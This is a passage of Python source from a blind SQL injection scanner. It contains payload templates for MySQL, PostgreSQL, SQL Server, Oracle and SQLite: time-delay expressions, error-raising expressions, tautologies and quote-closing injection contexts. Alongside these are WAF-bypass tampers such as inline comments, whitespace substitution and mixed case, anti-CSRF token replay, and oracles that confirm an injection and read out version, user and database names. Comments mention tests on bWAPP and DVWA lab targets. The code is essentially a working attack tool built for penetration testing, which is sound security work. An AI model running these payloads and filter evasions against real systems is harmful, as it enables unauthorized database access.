        norms = [normalize(b) for b in bodies if b is not None]
        if len(norms) < 2:
            return
        self.calibrated = True
        self.raw_sim = min(similarity(a, b) for a, b in self._pairs(norms))
        if self.raw_sim >= 1.0:
            self.self_sim = 1.0
            return

        sets = [set(n.split(" ")) for n in norms]
        union = set().union(*sets)
        common = set(sets[0]).intersection(*sets[1:])
        volatile = union - common

        # A page where a quarter of the vocabulary moves is not a stable page
        # with noise in it -- it is dynamic content. Masking that much would
        # erase the very difference the oracles look for, so refuse and say so
        # instead of silently comparing rubble.
        if union and len(volatile) > MAX_VOLATILE_RATIO * len(union):
            self.too_dynamic = True
            self.self_sim = self.raw_sim
            return

        self.words = frozenset(volatile)
        masked = [self.apply(n) for n in norms]
        self.self_sim = min(similarity(a, b) for a, b in self._pairs(masked))

    def describe(self) -> str:
        if not self.calibrated:
            return "page stability: not measured"
        if self.raw_sim >= 1.0:
            return "page stability: identical requests give identical pages"
        if self.too_dynamic:
            return (f"page stability: {self.raw_sim:.3f} against itself and too "
                    f"much of it moves to mask — boolean and error oracles will "
                    f"be unreliable here")
        return (f"page stability: {self.raw_sim:.3f} against itself, "
                f"{len(self.words)} volatile token(s) masked -> "
                f"{self.self_sim:.3f}")


# ----------------------------------------------------------------------------
# payloads
# ----------------------------------------------------------------------------

@dataclass(frozen=True)
class TimeForm:
    """
    One way to make an engine wait.

    Several per engine, tried in order, because a single shape is never enough:
    the first choice may be filtered (SLEEP blocked), and its behaviour depends
    on where the injection lands. See DBMS_LIST for what each one is for.
    """
    tpl: str                    # {c} = condition, {d} = seconds
    kind: str = "expr"          # expr: goes inside the WHERE clause
                                # stack: its own statement after a ';'
    note: str = ""


@dataclass
class Dbms:
    """
    Per-engine syntax.

    The three PoC expressions below are the only things this tool ever reads
    out of a database, and they are fixed here at import time. --poc picks one
    of them; there is intentionally no way to supply a different expression
    from the command line.
    """
    name: str
    banner: str                 # expression yielding the version string
    substr: str                 # substring(expr, pos, 1)
    ordinal: str                # numeric code point of a 1-char expression
    length: str                 # length(expr)
    tautology: str              # parses on THIS engine only, and is always true
    time_forms: tuple           # TimeForm, tried in order
    error_expr: str             # expression that RAISES when it is evaluated
    # Its non-raising twin, used as the control. The default is a run of zeros
    # of the same length, which is right as long as error_expr contains nothing
    # the page will re-encode. It does not hold for an expression carrying
    # quotes: json('') and 00000000 are both 8 characters raw and 8 vs 26 once
    # the echo is escaped, so the control and the probe no longer differ only
    # in whether they raise -- and the extra length was reported as a database
    # error on a page that had simply printed the payload back.
    error_safe: str = ""
    # The same idea where a STRING is expected. The concatenation contexts
    # ('||(...)||) put the expression inside the value being compared rather
    # than inside a boolean, which is how the reference payloads for this
    # family are written -- and it matters: a WHERE built as
    # `id = 'x' AND <expr>` may never evaluate <expr> when the row does not
    # match, while `id = 'x'||<expr>` is evaluated while the comparison value
    # is being built, always. Empty means this engine has no such form here.
    error_str: str = ""
    error_str_safe: str = ""
    # Oracle needs a FROM clause on every SELECT; everywhere else this is empty
    # and the scalar-subquery form is written without one.
    dual: str = ""
    comments: tuple = ("-- -",)
    comment: str = "-- -"
    user: str = ""              # current account, "" when the engine has none
    db: str = ""                # current database/schema, "" when meaningless

    def poc_expr(self, kind: str) -> str:
        """Expression for the requested PoC, or "" if this engine has none."""
        return {"banner": self.banner, "user": self.user, "db": self.db}.get(
            kind, self.banner)


# Verified by execution where an engine could be run locally: MariaDB 10.11 and
# PostgreSQL 16 both accept these inside the SUBSTRING/ASCII/LENGTH wrappers the
# extractor builds. MSSQL and Oracle are from their documented behaviour.
#   MySQL     DATABASE() is NULL when no schema is selected -> empty PoC, which
#             the reader already degrades to gracefully.
#   Postgres  current_user and current_database() are `name`; the implicit
#             coercion to text inside SUBSTRING works, so no ::text is needed
#             (one less character for a filter to catch).
#   SQLite    has no account and no meaningful current database: both are "",
#             and --poc user/db falls back to the banner with a warning.
DBMS_LIST = [
    Dbms("MySQL/MariaDB", banner="@@version",
         substr="SUBSTRING(({e}),{p},1)", ordinal="ASCII({e})",
         length="LENGTH(({e}))",
         tautology="connection_id()=connection_id()",
         time_forms=(
             # The sleep lives in a derived table, so the engine runs it ONCE
             # per statement instead of once per matching row, and the
             # enclosing AND cannot short-circuit it away. Measured on bWAPP:
             # the old IF(c,SLEEP(d),0) took 6ms on a page whose left-hand
             # predicate was false (never evaluated) and 30s on a page
             # returning ten rows (evaluated ten times) - a probe that either
             # misses the flaw or blows past the timeout. This form measured
             # exactly 3.0s on both.
             TimeForm("(SELECT 1337 FROM (SELECT(SLEEP({d}-(IF(({c}),0,{d}))))) zz)",
                      note="derived-table sleep"),
             # For hosts where SLEEP is filtered or disabled: burn CPU instead.
             # The iteration count scales with {d} so the proportionality check
             # still holds, though the absolute timing is machine-dependent.
             TimeForm("(SELECT 1337 FROM (SELECT(IF(({c}),"
                      "BENCHMARK(2000000*{d},MD5(1)),0))) zz)",
                      note="BENCHMARK"),
             TimeForm("(SELECT 1337 FROM (SELECT(SLEEP({d}))) zz WHERE ({c}))",
                      note="subselect-where"),
         ),
         error_expr="EXP(710)",     # DOUBLE out of range; 1/0 is only NULL here
         error_str="CAST(EXP(710) AS CHAR)",
         error_str_safe="CAST(EXP(000) AS CHAR)",
         comments=("-- -", "#", "/**/"),
         user="CURRENT_USER()", db="DATABASE()"),

    Dbms("PostgreSQL", banner="version()",
         substr="SUBSTRING(({e}) FROM {p} FOR 1)", ordinal="ASCII({e})",
         length="LENGTH(({e}))",
         tautology="5::int=5",
         time_forms=(
             # A scalar subquery is evaluated once whatever the row count, and
             # both CASE branches are integers. The previous shape,
             # CASE WHEN c THEN PG_SLEEP(d) ELSE 0 END, mixes void and integer:
             # verified against PostgreSQL 16, it raises
             # "CASE types integer and void cannot be matched" and never waits,
             # so time-based detection on this engine could not fire at all.
             TimeForm("1337=(SELECT 1337 FROM pg_sleep("
                      "CASE WHEN ({c}) THEN {d} ELSE 0 END))",
                      note="scalar subquery"),
             TimeForm("1337=(CASE WHEN ({c}) THEN "
                      "(SELECT 1337 FROM pg_sleep({d})) ELSE 1337 END)",
                      note="case-subquery"),
         ),
         error_expr="1/0",
         error_str="CAST(1/0 AS TEXT)", error_str_safe="CAST(1/1 AS TEXT)",
         comments=("-- -", "/**/"),
         user="current_user", db="current_database()"),

    Dbms("Microsoft SQL Server", banner="@@version",
         substr="SUBSTRING(({e}),{p},1)", ordinal="UNICODE({e})",
         length="LEN(({e}))",
         tautology="@@CONNECTIONS=@@CONNECTIONS",
         time_forms=(
             # WAITFOR is a STATEMENT, not an expression: it cannot be glued to
             # a WHERE clause, which is what the previous
             # "AND 1=1 WAITFOR DELAY ..." tried to do. It needs a statement of
             # its own, so the current one is closed and a second is stacked -
             # the only form the reference shows.
             TimeForm("IF ({c}) WAITFOR DELAY '0:0:{d}'", kind="stack"),
         ),
         error_expr="1/0",
         # MSSQL concatenates with + rather than ||; the concat-plus context
         # carries it.
         error_str="CAST(1/0 AS VARCHAR)", error_str_safe="CAST(1/1 AS VARCHAR)",
         comments=("-- -", "/**/"),
         user="SYSTEM_USER", db="DB_NAME()"),

    Dbms("Oracle", banner="(SELECT banner FROM v$version WHERE ROWNUM=1)",
         substr="SUBSTR(({e}),{p},1)", ordinal="ASCII({e})",
         length="LENGTH(({e}))",
         tautology="ROWNUM=ROWNUM",
         time_forms=(
             # FROM dual keeps it a scalar subquery: one wait per statement.
             TimeForm("1337=(SELECT CASE WHEN ({c}) THEN "
                      "DBMS_PIPE.RECEIVE_MESSAGE('a',{d}) ELSE 1337 END FROM dual)"),
         ),
         error_expr="1/0",
         error_str="TO_CHAR(1/0)", error_str_safe="TO_CHAR(1/1)",
         dual=" FROM dual",
         comments=("-- -",),
         user="USER", db="SYS_CONTEXT('USERENV','DB_NAME')"),

    Dbms("SQLite", banner="sqlite_version()",
         substr="SUBSTR(({e}),{p},1)", ordinal="UNICODE({e})",
         length="LENGTH(({e}))",
         tautology="sqlite_version()=sqlite_version()",
         time_forms=(),             # no sleep primitive: boolean or error only
         # 1/0 is NULL here, not an error. A malformed JSON document is the
         # cheapest thing that actually raises, which makes the error oracle
         # the only fallback SQLite has when the boolean signal is diluted.
         # The control is its exact twin: same length, same two quotes, so an
         # echoed payload is escaped to the same length on both branches and
         # cannot pass for an error. json(' ') is malformed, json('0') is not.
         # No whitespace in either: the verbose error pages that quote the
         # failing query collapse runs of spaces, so a control carrying a
         # space came back a few bytes shorter than the probe and the
         # difference was attributed to the error rather than to the echo.
         error_expr="json('x')", error_safe="json('0')",
         error_str="json('x')", error_str_safe="json('0')",
         comments=("-- -", "/**/")),
]


@dataclass(frozen=True)
class Ctx:
    """
    Where the injection point sits inside the statement.

    `tpl` carries three slots: {op} the boolean connector, {c} the condition,
    {cmt} the comment that swallows the rest of the query. `stack` is what has
    to be written to close the current statement before a second one can be
    appended - needed by MSSQL, whose delay is a statement rather than an
    expression.
    """
    label: str
    tpl: str
    stack: str = ""

    @property
    def uses_op(self) -> bool:
        return "{op}" in self.tpl

    @property
    def uses_cmt(self) -> bool:
        return "{cmt}" in self.tpl


# Both AND and OR must be tried: which one exposes the injection depends on
# whether the point's real value already matches a row. When it does (id=1),
# `AND (1=1)` keeps the row and `AND (1=2)` drops it. When it does NOT (id=aaa,
# a search miss, a bogus token), `AND` can never bring a row back and only `OR`
# reveals the flaw -- `aaa' OR (1=1)` returns everything, `aaa' OR (1=2)`
# nothing. Testing AND only is why a textbook DVWA id=aaa reads as clean.
CONTEXTS = [
    Ctx("numeric",                " {op} ({c}) {cmt}",            ""),
    Ctx("string-single",          "' {op} ({c}) {cmt}",           "'"),
    Ctx("string-double",          '" {op} ({c}) {cmt}',           '"'),
    Ctx("paren-string",           "') {op} ({c}) {cmt}",          "')"),
    Ctx("paren-numeric",          ") {op} ({c}) {cmt}",           ")"),
    # Comment-free forms. Every context above ends in a comment, so a filter
    # that strips -- and # defeats all of them at once; these close the literal
    # by hand instead and leave the tail of the query intact.
    Ctx("string-single-balanced", "' {op} ({c}) AND '1'='1",      "'"),
    # Same idea with no '=' anywhere, including in the balancing tail itself:
    # a filter on the operator otherwise blocks the very context meant to get
    # around a filter on comments.
    Ctx("string-single-like",     "' {op} ({c}) AND '1' LIKE '1", "'"),
    Ctx("string-double-balanced", '" {op} ({c}) AND "1"="1',      '"'),
    Ctx("paren-string-balanced",  "') {op} ({c}) AND ('1'='1",    "')"),
    # MySQL identifier quoting, and the extra nesting ORM-built queries produce.
    Ctx("backtick",               "` {op} ({c}) {cmt}",           "`"),
    Ctx("paren2-numeric",         ")) {op} ({c}) {cmt}",          "))"),
    Ctx("paren2-string",          "')) {op} ({c}) {cmt}",         "'))"),
    # The reference's "merging characters": || is OR on MySQL and concatenation
    # on Oracle/PostgreSQL, + is concatenation on MSSQL. No connector and no
    # parenthesis to guess, which reaches string contexts the quote forms miss.
    Ctx("concat-pipe",            "'||({c}){cmt}",                "'"),
    Ctx("concat-plus",            "'+({c}){cmt}",                 "'"),
]

# Boolean connectors tried for every context.
LOGIC_OPS = ["AND", "OR"]

# Condition pairs that are true / false without touching any table.
BOOL_PAIRS = [
    ("1=1", "1=2"),
    ("2>1", "2<1"),
    ("'a'='a'", "'a'='b'"),
    ("3*2=6", "3*2=7"),
]

# The same tautologies written without '=' or '>', for filters that block the
# comparison operators themselves rather than the keywords around them.
# The error oracle compares payloads that must differ ONLY in whether they can
# raise, so its condition literals are all the same length — otherwise a page
# that echoes the injected value back changes size for the wrong reason.
# They also avoid < > & ' " entirely: a page that reflects the value back
# HTML-escapes it, and '2>2' comes back as '2&gt;2' — three characters longer
# than its partner, which is exactly the kind of difference this family must
# not mistake for an error. Measured on bWAPP's login form.
ERROR_PAIRS = [
    ("1=1", "1=2"),
    ("3=3", "3=4"),
]

BOOL_PAIRS_NOEQ = [
    ("1 BETWEEN 1 AND 1", "1 BETWEEN 2 AND 2"),
    ("1 IN (1,2)", "1 IN (2,3)"),
    ("'a' LIKE 'a'", "'a' LIKE 'b'"),
    ("1 NOT IN (2,3)", "1 NOT IN (1,2)"),
]


# ----------------------------------------------------------------------------
# WAF bypass
#
# Transformations applied to a finished payload, tried only after the plain one
# has failed (see --waf). They are kept as whole-payload rewrites rather than
# woven into the templates so that the payload a finding reports is exactly the
# payload that was sent, tamper included.
# ----------------------------------------------------------------------------

_KEYWORDS = ("AND", "OR", "SELECT", "FROM", "WHERE", "CASE", "WHEN", "THEN",
             "ELSE", "END", "SLEEP", "BENCHMARK", "UNION", "BETWEEN", "LIKE",
             "NOT", "IN", "IF", "WAITFOR", "DELAY")
_KW_RX = re.compile(r"\b(" + "|".join(_KEYWORDS) + r")\b", re.I)


def _mixed_case(payload: str) -> str:
    def flip(m):
        w = m.group(0)
        return "".join(c.upper() if i % 2 else c.lower()
                       for i, c in enumerate(w))
    return _KW_RX.sub(flip, payload)


def _inline_comment(payload: str) -> str:
    """MySQL conditional comments: the keyword still executes, the filter that
    matches on the bare word does not see it."""
    return _KW_RX.sub(lambda m: f"/*!50000{m.group(0)}*/", payload)


def _logic_symbols(payload: str) -> str:
    return (payload.replace(" AND ", "&&").replace(" and ", "&&")
                   .replace(" OR ", "||").replace(" or ", "||"))


# Alternative whitespace. Only unambiguous ASCII control characters are used:
# the reference also lists %A0 (non-breaking space), but this tool encodes
# parameters as UTF-8, where it would travel as %C2%A0 and never reach the
# parser as a space.
TAMPERS = [
    ("plain",         lambda p: p),
    ("space2comment", lambda p: p.replace(" ", "/**/")),
    ("space2tab",     lambda p: p.replace(" ", "\t")),
    ("space2newline", lambda p: p.replace(" ", "\n")),
    ("space2vtab",    lambda p: p.replace(" ", "\x0b")),
    ("space2formfeed", lambda p: p.replace(" ", "\x0c")),
    ("mixedcase",     _mixed_case),
    ("logic2symbol",  _logic_symbols),
    ("mysqlinline",   _inline_comment),
]
TAMPER_BY_NAME = dict(TAMPERS)

# The escalation pass is quadratic if it reruns every context, so it reruns the
# two that actually produce findings, in both polarities.
WAF_CONTEXTS = [c for c in CONTEXTS
                if c.label in ("numeric", "string-single",
                               "string-single-balanced", "string-single-like")]

# Every context costs two requests per connector on every point that turns out
# clean, which is most of them, so the list is tiered rather than swept whole.
# Level 1 is the original budget; level 2 adds the shapes that actually recur
# in the wild (comment-stripping filters, string concatenation); level 3 adds
# the rest. Same idea as cmdhunt's --level.
_L1 = ("numeric", "string-single", "string-double", "paren-string",
       "paren-numeric")
_L2 = _L1 + ("string-single-balanced", "string-single-like", "string-double-balanced",
             "paren-string-balanced", "concat-pipe", "concat-plus")

CONTEXTS_BY_LEVEL = {
    1: [c for c in CONTEXTS if c.label in _L1],
    2: [c for c in CONTEXTS if c.label in _L2],
    3: list(CONTEXTS),
}

# Time probes are the expensive ones: a hit costs a real delay and a miss still
# costs a round trip, so they stay on the shapes a delay actually lands in.
TIME_CONTEXTS = [c for c in CONTEXTS
                 if c.label in ("numeric", "string-single", "string-double",
                                "paren-string", "paren-numeric",
                                "concat-pipe")]


def contexts_for(args, time_based: bool = False) -> list:
    """The context sweep for this run: tiered by --level, widened by --waf."""
    level = getattr(args, "level", 2)
    if time_based:
        return (list(CONTEXTS) if getattr(args, "waf", False)
                else [c for c in TIME_CONTEXTS
                      if c in CONTEXTS_BY_LEVEL.get(level, CONTEXTS_BY_LEVEL[2])])
    return CONTEXTS_BY_LEVEL.get(level, CONTEXTS_BY_LEVEL[2])


def build_condition(ctx: Ctx, cond: str, dbms: Dbms, op: str = "AND",
                    cmt: str | None = None, tamper: str = "plain") -> str:
    """Place an arbitrary boolean condition into the statement context."""
    out = ctx.tpl.format(op=op, c=cond,
                         cmt=(dbms.comment if cmt is None else cmt))
    return TAMPER_BY_NAME.get(tamper, TAMPERS[0][1])(out)


def build_time(ctx: Ctx, dbms: Dbms, seconds: int, cond="1=1",
               op: str = "AND", form: TimeForm | None = None,
               tamper: str = "plain") -> str | None:
    """A payload that makes the engine wait `seconds` when `cond` holds."""
    if form is None:
        if not dbms.time_forms:
            return None
        form = dbms.time_forms[0]
    body = form.tpl.format(c=cond, d=seconds)
    if form.kind == "stack":
        # Close the running statement, append ours, comment out the remainder.
        out = f"{ctx.stack}; {body} {dbms.comment}"
    else:
        out = ctx.tpl.format(op=op, c=body, cmt=dbms.comment)
    return TAMPER_BY_NAME.get(tamper, TAMPERS[0][1])(out)


# ----------------------------------------------------------------------------
# blind testing
# ----------------------------------------------------------------------------

@dataclass
class Confirmation:
    kind: str                   # "boolean" | "time" | "error"
    dbms: Dbms | None
    context: Ctx
    true_payload: str
    false_payload: str
    evidence: str
    op: str = "AND"             # boolean connector that exposed the injection
    true_resembles_base: bool = True
    # For a boolean hit: does the logically-TRUE condition render LIKE the
    # baseline? True in the AND polarity (a matching value kept), False in the
    # OR polarity (a non-matching value flooded with rows). The extraction
    # oracle must invert its reading accordingly.
    tamper: str = "plain"       # rewrite that got through the filter; the
                                # extraction oracle has to reuse the same one
    form: TimeForm | None = None    # the delay shape that worked, reused when
                                    # reading the banner through a time oracle
    ok_norm: str = ""           # error oracle: the non-erroring response, which
                                # is what TRUE looks like (baseline may differ)
    # Boolean hit: the two page shapes the confirmation actually observed, kept
    # so the extraction oracle can classify an answer against BOTH of them
    # instead of against the baseline alone. In OR polarity "unlike the
    # baseline" is also what a 500 looks like, so an unparsable payload read as
    # TRUE and the extraction came back as a row of '~'. Measured on a login
    # form: asking PostgreSQL the MySQL tautology raised, the raise was scored
    # TRUE, and the engine was reported as MySQL.
    ref_true: str = ""
    ref_false: str = ""
    # Marker route: the fragments that appear on one branch and not on the
    # other. Used when the two pages are nearly identical -- a conditional
    # response can be one line inside a catalogue, which no similarity
    # threshold can separate from noise, but which is perfectly identifiable
    # as a fragment that is either there or not.
    by_marker: bool = False
    mark_true: frozenset = frozenset()
    mark_false: frozenset = frozenset()


TOKEN_REJECTED = frozenset({400, 401, 403, 419, 422, 440})


class TokenTracker:
    """
    Carries a form's anti-CSRF token forward across probes.

    A token that stays valid for the session needs none of this: replaying the
    captured value works, which is what the first bench measured. A SINGLE-USE
    token invalidates itself on the preflight request, every probe after it
    comes back 400, and the scan reports "not injectable" about a page it never
    reached -- measured on the same form with one-shot tokens: 103 requests,
    page stability 0.000 against itself, nothing found.

    The fresh token is read out of the previous response, so the common case
    costs nothing. Only a response that carries no form at all (a redirect, a
    500) forces one extra GET, and only after a rejection proves it necessary.
    """

    def __init__(self, http: Http, con: Console, fields: dict, refresh_url: str):
        self.http = http
        self.con = con
        self.fields = dict(fields)          # name -> most recent value
        self.refresh_url = refresh_url
        self.refreshes = 0
        self.rejections = 0

    def __bool__(self):
        return bool(self.fields)

    def apply(self, body: dict, skip: str = "") -> dict:
        """Put the freshest known token into every tracked field but `skip`."""
        for name, value in self.fields.items():
            if name != skip and name in body and value:
                body[name] = value
        return body

    def observe(self, body_html: str) -> bool:
        """Read a new value for any tracked field out of a response."""
        if not body_html or "<" not in body_html:
            return False
        found = False
        for tag in _TAG_RX.findall(body_html):
            attrs = _tag_attrs(tag)
            name = attrs.get("name", "")
            if name in self.fields:
                new = attrs.get("value", attrs.get("content", ""))
                if new and new != self.fields[name]:
                    self.fields[name] = new
                    found = True
        return found

    def refresh(self) -> bool:
        """Fetch the form page again to get a usable token."""
        if not self.refresh_url:
            return False
        r = self.http.send(self.refresh_url)
        self.refreshes += 1
        return bool(r.ok and self.observe(r.body))


class BlindTester:
    """
    Confirms a blind injection without extracting anything.

    Boolean: a TRUE condition must render like the baseline and a FALSE one must
    not, by a margin, and the whole thing must reproduce with a second, unrelated
    condition pair. Requiring two independent pairs is what keeps ordinary
    dynamic pages from reading as injectable.

    Time: the delay must track the requested duration across two different
    durations, with a zero-delay control in between. A page that is merely slow
    fails that test because its latency does not scale with `d`.
    """

    def __init__(self, http: Http, con: Console, args):
        self.http = http
        self.con = con
        self.args = args
        self.noise = PageNoise()        # identity until calibrate() runs
        self.tokens: "TokenTracker | None" = None
        # Why a family declined, counted. A run that confirms the injection but
        # reads nothing out of it is the hardest kind to debug from the
        # outside, so the reasons travel back with the finding instead of
        # living only in -v 2 output.
        self.reasons: collections.Counter = collections.Counter()

    def note(self, why: str) -> None:
        self.reasons[why] += 1

    def why_not(self) -> str:
        if not self.reasons:
            return "no family was run"
        return "; ".join(f"{n}x {w}" for w, n in self.reasons.most_common(4))

    def norm(self, body: str) -> str:
        """Normalise, then drop what this page was measured to change alone."""
        return self.noise.apply(normalize(body))

    def cmp_body(self, r: Response, pt: Point, sent: str = "") -> str:
        """
        The form of a response the oracles compare.

        Both echoes come out, and both come out of EVERY side: the payload,
        and the point's own base value. Stripping only the payload is not
        symmetric -- the baseline loses every occurrence of "Lifestyle",
        including the ones in the navigation, while a probe page keeps them
        because only the longer string matched. Measured: the TRUE branch of
        the correct context scored 0.208 against its own baseline, below the
        FALSE branch at 0.333, so the polarity itself came out inverted.
        """
        n = self.norm(r.body)
        if sent:
            n = strip_echo(n, sent)
        base = pt.current()
        return strip_echo(n, base) if base else n

    def calibrate(self, resend, first: Response, samples: int = 2) -> None:
        """
        Ask the target to repeat itself, and learn what it does not repeat.

        `resend` replays the UNMODIFIED request; `first` is the preflight
        response already in hand. Cost: `samples` requests per target, once --
        against the 20 to 400 a single injection point already spends.
        """
        if samples < 1 or getattr(self.args, "no_calibrate", False):
            return
        bodies = [first.body]
        for _ in range(samples):
            r = resend()
            if r.ok:
                bodies.append(r.body)
        self.noise.learn(bodies)
        line = self.noise.describe()
        if self.noise.too_dynamic:
            self.con.warn(line)
        else:
            self.con.info(line)

    # -- plumbing

    def request(self, pt: Point, value: str) -> Response:
        if pt.inject == "cookie":
            # one cookie carries the payload, the others are replayed as they
            # were: dropping them would change the session the query runs in
            jar = dict(pt.cookies or {})
            jar[pt.param] = value
            m = pt.method if pt.method in ("GET", "POST") else "GET"
            body = dict(pt.data) if (m == "POST" and pt.data) else None
            return self.http.send(pt.url, m, data=body,
                                  headers={"Cookie": build_cookie_header(jar)})
        if pt.header:
            # header injection keeps the request's own verb and body, so a
            # header vuln behind a POST endpoint is still reached
            m = pt.method if pt.method in ("GET", "POST") else "GET"
            body = dict(pt.data) if (m == "POST" and pt.data) else None
            return self.http.send(pt.url, m, data=body, headers={pt.header: value})
        if pt.inject == "query" and pt.method == "POST":
            # inject a URL query parameter while keeping the POST body intact
            body = dict(pt.data) if pt.data else None
            return self.http.send(set_query_param(pt.url, pt.param, value),
                                  "POST", data=body)
        if pt.inject == "body" or (pt.method == "POST" and pt.inject != "query"):
            body = dict(pt.data or {})
            body[pt.param] = value
            return self.http.send(pt.url, "POST", data=body)
        if pt.data is not None:
            fields = dict(pt.data)
            fields[pt.param] = value
            joiner = "&" if "?" in pt.url else "?"
            return self.http.send(pt.url + joiner + urlencode(fields))
        return self.http.send(set_query_param(pt.url, pt.param, value))

    def _inject(self, pt: Point, suffix: str) -> Response:
        """Payload is appended to the point's real value — never replaces it."""
        return self.request(pt, pt.current() + suffix)

    # -- boolean

    def _bool_try(self, pt: Point, base_norm: str, ctx: Ctx, op: str,
                  pairs, tamper: str) -> Confirmation | None:
        """One (context, connector, condition-pair set, tamper) combination."""
        hi, lo = self.args.true_threshold, self.args.false_threshold
        delta = self.args.min_delta
        dbms = DBMS_LIST[0]          # comment syntax only; engine-agnostic here

        t_pl = build_condition(ctx, pairs[0][0], dbms, op=op, tamper=tamper)
        f_pl = build_condition(ctx, pairs[0][1], dbms, op=op, tamper=tamper)
        rt = self._inject(pt, t_pl)
        rf = self._inject(pt, f_pl)
        if not (rt.ok and rf.ok):
            return None
        # The echo is stripped HERE too, not only in the error oracle. A page
        # that prints the category back puts the whole payload into the body,
        # so the TRUE branch -- which must look like the baseline -- differs
        # from it by the length of the payload. Measured on a 1040-byte filter
        # page: the correct context and the correct polarity scored 0.720
        # against a 0.95 threshold, and the real injection was dropped.
        n_true = self.cmp_body(rt, pt, pt.current() + t_pl)
        n_false = self.cmp_body(rf, pt, pt.current() + f_pl)
        st = similarity(base_norm, n_true)
        sf = similarity(base_norm, n_false)
        tag = f"{ctx.label}/{op}" + ("" if tamper == "plain" else f"/{tamper}")
        self.con.debug(f"    [{tag}] sim(true)={st:.3f} "
                       f"sim(false)={sf:.3f} status {rt.status}/{rf.status}")

        # Two polarities. AND: a matching value keeps its row when the
        # condition is TRUE (true~baseline) and loses it when FALSE.
        # OR: a non-matching value stays empty on FALSE (false~baseline)
        # and floods with rows on TRUE (true!=baseline).
        and_pol = st >= hi and sf <= lo and (st - sf) >= delta
        or_pol = sf >= hi and st <= lo and (sf - st) >= delta
        if not (and_pol or or_pol):
            return self._bool_marker(pt, base_norm, ctx, op, pairs, tamper,
                                     tag, t_pl, f_pl, n_true, n_false, st, sf)
        true_like_base = and_pol

        # reproduce with an unrelated pair, same polarity, before believing it
        t2 = build_condition(ctx, pairs[-1][0], dbms, op=op, tamper=tamper)
        f2 = build_condition(ctx, pairs[-1][1], dbms, op=op, tamper=tamper)
        r2t, r2f = self._inject(pt, t2), self._inject(pt, f2)
        if not (r2t.ok and r2f.ok):
            return None
        s2t = similarity(base_norm, self.cmp_body(r2t, pt, pt.current() + t2))
        s2f = similarity(base_norm, self.cmp_body(r2f, pt, pt.current() + f2))
        self.con.debug(f"    [{tag}] verify sim(true)={s2t:.3f} "
                       f"sim(false)={s2f:.3f}")
        ok2 = ((s2t >= hi and s2f <= lo) if true_like_base
               else (s2f >= hi and s2t <= lo))
        if not ok2:
            self.con.debug(f"    [{tag}] second pair disagreed — "
                           f"treating as dynamic content, not a hit")
            return None

        hi_s, lo_s = (st, sf) if true_like_base else (sf, st)
        which = ("TRUE~baseline, FALSE differs" if true_like_base
                 else "FALSE~baseline, TRUE floods rows")
        how = "" if tamper == "plain" else f"; filter bypassed with '{tamper}'"
        return Confirmation(
            "boolean", None, ctx, t_pl, f_pl,
            f"{op} polarity ({which}): the baseline-like branch renders "
            f"at similarity {hi_s:.3f}, the other at {lo_s:.3f} "
            f"(delta {abs(st - sf):.3f}); reproduced with a second "
            f"condition pair at {s2t:.3f}/{s2f:.3f}{how}",
            op=op, true_resembles_base=true_like_base, tamper=tamper,
            ref_true=n_true, ref_false=n_false)

    def _bool_marker(self, pt: Point, base_norm: str, ctx: Ctx, op: str,
                     pairs, tamper: str, tag: str, t_pl: str, f_pl: str,
                     n_true: str, n_false: str,
                     st: float, sf: float) -> Confirmation | None:
        """
        The same two branches, read as presence instead of distance.

        A conditional response is often ONE line inside a page that is
        otherwise constant -- 67 bytes of "Welcome back!" in a 4700-byte
        catalogue. Honestly measured, those two pages are 0.98 alike, and no
        threshold can tell that apart from noise without also firing on every
        dynamic page on the internet. What identifies it is not how far the
        page moved but that a fragment is there on one branch and gone on the
        other, and that the SAME fragment moves again under a second,
        unrelated condition pair.

        Two things make this safe rather than reckless. The page was measured
        to repeat itself before any payload was sent, so a fragment that
        appears and disappears is not the page being alive. And the second
        pair carries different literals, so a difference produced by the
        payload's own echo cannot reproduce it: the marker would contain the
        condition's text and the two sets would not match.
        """
        if n_true == n_false:
            return None
        noise = self.noise
        if not noise.calibrated or noise.too_dynamic or \
                noise.self_sim < self.args.true_threshold:
            self.con.debug(f"    [{tag}] pages differ but the target was not "
                           f"measured stable — no marker test")
            return None

        sh_t, sh_f = shingles(n_true), shingles(n_false)
        mark_t, mark_f = frozenset(sh_t - sh_f), frozenset(sh_f - sh_t)
        if not (mark_t or mark_f):
            return None
        self.con.debug(f"    [{tag}] pages differ by {len(mark_t)}/"
                       f"{len(mark_f)} fragment(s) at sim {st:.3f}/{sf:.3f} — "
                       f"checking the marker against a second pair")

        dbms = DBMS_LIST[0]
        t2 = build_condition(ctx, pairs[-1][0], dbms, op=op, tamper=tamper)
        f2 = build_condition(ctx, pairs[-1][1], dbms, op=op, tamper=tamper)
        r2t, r2f = self._inject(pt, t2), self._inject(pt, f2)
        if not (r2t.ok and r2f.ok):
            return None
        n2t = self.cmp_body(r2t, pt, pt.current() + t2)
        n2f = self.cmp_body(r2f, pt, pt.current() + f2)
        sh2t, sh2f = shingles(n2t), shingles(n2f)
        if frozenset(sh2t - sh2f) != mark_t or frozenset(sh2f - sh2t) != mark_f:
            self.con.debug(f"    [{tag}] the second pair moved a different "
                           f"fragment — echo or dynamic content, not a hit")
            return None

        true_like_base = similarity(base_norm, n_true) >= similarity(base_norm,
                                                                     n_false)
        sample = sorted(mark_t or mark_f)[0]
        sample = sample if len(sample) <= 72 else sample[:69] + "..."
        how = "" if tamper == "plain" else f"; filter bypassed with '{tamper}'"
        return Confirmation(
            "boolean", None, ctx, t_pl, f_pl,
            f"{op} polarity, marker route: the two branches render at "
            f"similarity {st:.3f}/{sf:.3f} against the baseline — too close "
            f"for a threshold — but differ by {len(mark_t)} fragment(s) "
            f"present only when the condition is true and {len(mark_f)} "
            f"present only when it is false, e.g. {sample!r}; the same "
            f"fragments move again under an unrelated condition pair, on a "
            f"page measured to repeat itself byte for byte{how}",
            op=op, true_resembles_base=true_like_base, tamper=tamper,
            ref_true=n_true, ref_false=n_false,
            by_marker=True, mark_true=mark_t, mark_false=mark_f)

    def boolean(self, pt: Point, baseline: Response,
                tamper: str = "plain") -> Confirmation | None:
        # the baseline echoes the point's own value, so it loses it too --
        # otherwise the two sides are not stripped the same way
        base_norm = self.cmp_body(baseline, pt)
        for ctx in contexts_for(self.args):
            for op in (LOGIC_OPS if ctx.uses_op else ["AND"]):
                conf = self._bool_try(pt, base_norm, ctx, op, BOOL_PAIRS,
                                      tamper)
                if conf:
                    return conf
        if not getattr(self.args, "waf", False):
            return None

        # Escalation, only once the plain pass has come back empty.
        #
        # The variants are CROSSED, not tried one at a time. A filter worth
        # bypassing rarely blocks a single thing: the one on the bench blocks
        # spaces, '=', '--', '#' and '/*' together, and the payload that gets
